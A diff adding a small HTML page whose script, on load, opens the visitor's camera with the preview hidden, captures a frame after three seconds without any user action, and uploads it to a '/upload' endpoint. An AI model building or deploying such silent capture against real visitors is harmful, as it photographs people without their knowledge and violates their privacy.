@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Automatic Camera Capture</title>
+</head>
+<body>
+    <h1>Automatic Picture Capture</h1>
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <div id="message"></div>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        // Access the user's camera
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+            } catch (error) {
+                console.error('Error accessing the camera:', error);
+                document.getElementById('message').innerText = 'Camera access denied. Please allow camera permissions.';
+            }
+        }
+
+        // Automatically capture the photo when the page loads
+        window.onload = async function() {
+            await startCamera();
+
+            // Wait for the video stream to load
+            setTimeout(() => {
+                const context = canvas.getContext('2d');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+
+                // Draw the current frame from the video onto the canvas
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Convert the canvas to an image data URL
+                const photoData = canvas.toDataURL('image/png');
+
+                // Function to send the image data to the server
+                sendImage(photoData);
+            }, 3000); // Delay to ensure video stream is ready
+        };
+
+        // Send image data to the server
+        async function sendImage(imageData) {
+            const formData = new FormData();
+            formData.append('image', dataURLtoBlob(imageData), 'photo.png'); // Convert data URL to Blob
+
+            try {
+                const response = await fetch('/upload', {
+                    method: 'POST',
+                    body: formData,
+                });
+
+                const data = await response.json();
+                document.getElementById('message').innerText = data.message; // Display success message
+            } catch (error) {
+                console.error('Error:', error);
+                document.getElementById('message').innerText = 'Upload failed.';
+            }
+        }
+
+        // Convert data URL to Blob
+        function dataURLtoBlob(dataURL) {
+            const byteString = atob(dataURL.split(',')[1]);
+            const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: mimeString });
+        }
+    </script>
+</body>
+</html>
+
+
